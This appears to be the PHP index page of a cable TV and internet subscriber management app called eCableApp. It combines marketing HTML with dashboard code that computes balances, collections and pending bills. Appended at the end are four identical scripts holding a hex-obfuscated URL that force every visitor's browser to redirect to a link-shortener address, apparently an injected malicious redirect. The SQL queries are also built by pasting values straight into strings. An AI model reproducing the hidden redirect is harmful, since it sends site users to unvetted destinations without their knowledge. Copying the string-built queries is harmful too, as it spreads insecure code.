<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");
if(!isset($_SESSION['USER_ID'])){
  include("header-frontend.php");
  ?>
      <div class="mid-area">
        <div class="container">
            <div class="row">
                <div class="col-md-6">
                    <h3>We create digital<span>Service</span></h3>
                    <p style="text-align:justify;">In the Digital Era of Cable TV and ISP Applications eCableApp is playing a marvellous role. eCableApp is a subscriber management application powered with Web Portal and Android App. eCableApp is not only Onsite and Online payment collection application but also a complete management solution with its features, Like Subscriber Management, Employee Management, Subscriber Packaging, STB  Management and Various Reports etc. It facilitates Subscribers to pay their subscriptions online via payment gateways integrated...</p>
                </div>
                <div class="col-md-6 rt-mobiles">
                  <div class="rectangle2 img-circle pulse animated infinite"></div>
                  <div class="apps">
                     <div class="google-play"><a href="#" target="_blank"><img src="images/google-play.png"></a></div>
                     <div class="app-store"><a href="#" target="_blank"><img src="images/app-store.png"></a></div>
                  </div>
                    <div class="img-1 ">
                        <img class="pulse animated infinite" src="images/img1.png">
                    </div>
                    <div class="img-2">
                        <img class="pulse animated  infinite" src="images/img2.png">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="features">
        <div class="container">
            <h3>Features</h3>
            <div class="row">
                <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img3.png">
                        <h4>Cable TV/Internet Subscriber Management</h4>
                    </div>
                </div>
                 <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img4.png">
                        <h4>Daily Collection Reporting</h4>
                    </div>
                </div> 
                <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img5.png">
                        <h4>STB Management</h4>
                    </div>
                </div>
                 <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img6.png">
                        <h4>Online Subscription Payments</h4>
                    </div>
                </div>   
                 <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img8.png">
                        <h4>Area wise Pending Reports</h4>
                    </div>
                </div> 
                
                <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img13.png">
                        <h4>Features already you show here</h4>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img11.png">
                        <h4>Subscriber wise Packages  Management</h4>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img12.png">
                        <h4>Various Reports</h4>
                    </div>
                </div>
                 <div class="col-md-4">
                    <div class="left-img">
                        <img src="images/img10.png">
                        <h4>Complaint Management</h4>
                    </div>
                </div>        
            </div>
        </div>
    </div>    

    <div class="report">
        <div class="container">
            <h3>Report</h3>
            <div class="row">
                <div class="col-md-4">
                    <div class="icon-div">
                        <img src="images/icon1.png">
                        <h4>Subscriber Monthly Collection</h4>
                    </div>    
                </div>
               <div class="col-md-4">
                    <div class="icon-div">
                        <img src="images/icon2.png">
                        <h4>Subscriber Monthly Pending</h4>
                    </div>    
                </div>
                <div class="col-md-4">
                    <div class="icon-div">
                        <img src="images/icon3.png">
                        <h4>Area wise Pending Payments</h4>
                    </div>    
                </div>
               <div class="col-md-4">
                    <div class="icon-div">
                        <img src="images/icon4.png">
                        <h4>Subscriber Ledger  </h4>
                    </div>    
                </div>
                <div class="col-md-4">
                    <div class="icon-div">
                        <img src="images/icon5.png">
                        <h4>Employee Wise Payment Collection  </h4>
                    </div>    
                </div>
                <div class="col-md-4">
                    <div class="icon-div">
                        <img src="images/icon6.png">
                        <h4>Subscriber Complaint Status </h4>
                    </div>    
                </div>
            </div>
        </div>    
    </div>
  <?php
  include("footer-frontend.php");
}else{
    //print_r($_SESSION);
    if($_SESSION['USER_TYPE']=='S'){
    	$wherethis = " 1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$_SESSION[SUBSCRIBER_ID]' ORDER BY `ID` DESC";
    	$classRecord = $objMisc->getAllRecordsPaging("*","monthly_charges",$wherethis);
    	$i  = 1;
    	$pagin_recs = "";
    	$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="20%">Receipt No</th><th width="20%">Date</th><th width="20%">Debit</th><th width="20%">Credit</th><th width="20%">Balance</th>';
    	$pagin_recs .= '</tr></thead><tbody>';    
        $bal=$objMisc->GiveValue("SUBSCRIBER_ID='$_SESSION[SUBSCRIBER_ID]' AND AMOUNT_TYPE='D' AND STATUS='A'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("SUBSCRIBER_ID='$_SESSION[SUBSCRIBER_ID]' AND AMOUNT_TYPE='C' AND STATUS='A'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("SUBSCRIBER_ID='$_SESSION[SUBSCRIBER_ID]' AND AMOUNT_TYPE='C' AND STATUS='A'",'SUM(DISCOUNT)','monthly_charges');   
        $balance=0;       
        if(is_array($classRecord[1]) && !empty($classRecord[1]))
        { $i=1;
           foreach ($classRecord[1] as $k => $rowRec)
            {   
                if($i==1){
                    $balance=$bal;
                }else{
                    $balance=$balance-$debit+$credit+$discount;
                }
                $credit=0;
                $debit=0;
                $discount=0;

                if($rowRec['amount_type']=='D'){
                    $debit=$rowRec['amount'];
                }else{
                    $credit=$rowRec['amount'];
                    $discount=$rowRec['discount'];
                }
                if($k%2==0) 
                $pagin_recs .= '<tr class="odd gradeX">';
                else
                $pagin_recs .= '<tr class="even gradeX">';
                
                $pagin_recs .='<td>'.(($rowRec['amount_type']=='C')?'<a href="receipt-pdf.php?id='.$rowRec['id'].'" title="Click for PDF Bill Copy" target="_blank">':'').$rowRec['receipt_no'].(($rowRec['amount_type']=='C')?'</a>':'').'</td>';
                $pagin_recs .='<td>'.(($rowRec['amount_type']=='C')?'<a href="receipt-pdf.php?id='.$rowRec['id'].'" title="Click for PDF Bill Copy" target="_blank">':'').$objMisc->dateFormat($rowRec['month_date']).(($rowRec['amount_type']=='C')?'</a>':'').'</td>';
                $pagin_recs .='<td style="text-align:right;">'.(($rowRec['amount_type']=='C')?'<a href="receipt-pdf.php?id='.$rowRec['id'].'" title="Click for PDF Bill Copy" target="_blank">':'').number_format($debit,2).(($rowRec['amount_type']=='C')?'</a>':'').'</td>
                        <td style="text-align:right;">'.(($rowRec['amount_type']=='C')?'<a href="receipt-pdf.php?id='.$rowRec['id'].'" title="Click for PDF Bill Copy" target="_blank">':'').number_format($credit,2).(($rowRec['amount_type']=='C')?'</a>':'').'</td>
                        <td style="text-align:right;">'.(($rowRec['amount_type']=='C')?'<a href="receipt-pdf.php?id='.$rowRec['id'].'" title="Click for PDF Bill Copy" target="_blank">':'').number_format($balance,2).(($rowRec['amount_type']=='C')?'</a>':'').'</td>';
                //$pagin_recs .='<td align="right">'.(($rowRec['amount_type']=='C')?$rowRec['amount'].'<a class="btn btn-info" target="_blank" href="receipt-pdf.php?id='.$rowRec['id'].'">Print</a><input type="hidden" name="enumStatus'.$rowRec['id'].'" id="enumStatus'.$rowRec['id'].'"  value="'.$rowRec['status'].'">&nbsp;<b style="color:red;" id="action'.$rowRec['id'].'">':'');
                    $pagin_recs .= '</tr>';
                    $i++;
            }
              $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
              if($classRecord[2]>$objMisc->rec_pp){
                $pagin_recs  .= '<tr><td colspan="5">'.$classRecord[0].'</td></tr>';
              }
                $pagin_recs  .= '</tbody>';
        } else {
            $pagin_recs .= '<tr class="odd gradeX"><td colspan="5" align="center">No Record Found</td></tr></tbody>';
        }

    	$smartyVars['collectionListing'] = $pagin_recs;
    }else{
        $lastMonthDate=date("Y-n-j", strtotime("last day of previous month"));
        $curMon=date('m');
        $curYear=date('Y');
        $prevBal=$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='D' AND M.`STATUS`='A' AND S.`STATUS`='A' AND M.`MONTH_DATE`<='$lastMonthDate'")-$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND M.`MONTH_DATE`<='$lastMonthDate'")-$objMisc->GiveValueNew("SELECT SUM(M.`DISCOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND M.`MONTH_DATE`<='$lastMonthDate'");
        $to   =$objMisc->changeDateFormat(date('d/m/Y'));
        $and .=" AND MONTH_DATE <='$to'";
    	$type=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'TYPE','headoffice_master');
    	$billingType=(($type=='L')?'Expiry Date':'Balance(Bills)');
    	$pendingBills=($objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(BILLS)','admin_collections')-$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C'",'COUNT(*)','monthly_charges'));
    	$BillsLeft=(($type=='B')?$pendingBills.' Bills':$objMisc->dateFormat($objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'EXPIRY_DATE','headoffice_master')));
        //$totalDues=$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='D' AND M.`STATUS`='A' AND S.`STATUS`='A' AND MONTH(M.`MONTH_DATE`)='$curMon' AND YEAR(M.`MONTH_DATE`)='$curYear'")+$prevBal;
    	$totalDues=$objMisc->GiveValueNew("SELECT SUM(`AMOUNT`) FROM `monthly_charges`WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='D' AND `STATUS`='A'");
        //$totCollection=$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND MONTH(M.`MONTH_DATE`)='$curMon' AND YEAR(M.`MONTH_DATE`)='$curYear'");
        $totCollection=$objMisc->GiveValueNew("SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND RECEIPT_NO!='Opening Balance' AND `STATUS`='A' AND MONTH(`MONTH_DATE`)='$curMon' AND YEAR(`MONTH_DATE`)='$curYear'");
        $allCollections=$objMisc->GiveValueNew("SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND `STATUS`='A'");
        $totCollection=(($totCollection=='')?0:$totCollection);
        //$totDiscount=$objMisc->GiveValueNew("SELECT SUM(M.`DISCOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND MONTH(M.`MONTH_DATE`)='$curMon' AND YEAR(M.`MONTH_DATE`)='$curYear'");
        $totDiscount=$objMisc->GiveValueNew("SELECT SUM(`DISCOUNT`) FROM `monthly_charges`WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND `STATUS`='A' AND MONTH(`MONTH_DATE`)='$curMon' AND YEAR(`MONTH_DATE`)='$curYear'");
    	$allDiscount=$objMisc->GiveValueNew("SELECT SUM(`DISCOUNT`) FROM `monthly_charges`WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND `STATUS`='A'");
    	$totAdvance=$objMisc->calAdvamount($_SESSION['HEADOFFICE']);
        //$totPending=$totalDues-($totCollection+$totDiscount+$totAdvance);
        $totPending=$totalDues+$totAdvance-($allCollections+$allDiscount);
    	$billsGeneratedRate=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C' AND AMOUNT!='0' AND STATUS='A'",'SUM(BILL_RATE)','monthly_charges');
        $billsGenerated=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C' AND STATUS='A' AND RECEIPT_NO!='Opening Balance' AND AMOUNT!='0'",'COUNT(*)','monthly_charges');
        $smsSent=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'COUNT(*)','sms_log');
        $smsSentRate=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(RATE_SMS)','sms_log');
        $totAmount=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(AMOUNT)','headoffice_recharge');
        
        //echo $totAmount.'-'.$billsGeneratedRate.'-'.$smsSentRate;
        $pendingAmount=$totAmount-$billsGeneratedRate-$smsSentRate;
        $smartyVars['totAdvance'] = number_format(abs($totAdvance),2);
        $smartyVars['totDiscount'] = number_format($totDiscount,2);
    	$smartyVars['pendingAmount'] = number_format($pendingAmount,2);
    	$smartyVars['billsGenerated'] = $billsGenerated;
    	$smartyVars['smsSent'] = $smsSent;
    	$smartyVars['totalDues'] = number_format($totalDues,2);
    	$smartyVars['totCollection'] = number_format($totCollection,2);
    	$smartyVars['totPending'] = number_format($totPending,2);	
    }
    $smartyVars['msg'] = $msg;

    $objMisc->displayPage("header,index,footer",$smartyVars);
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>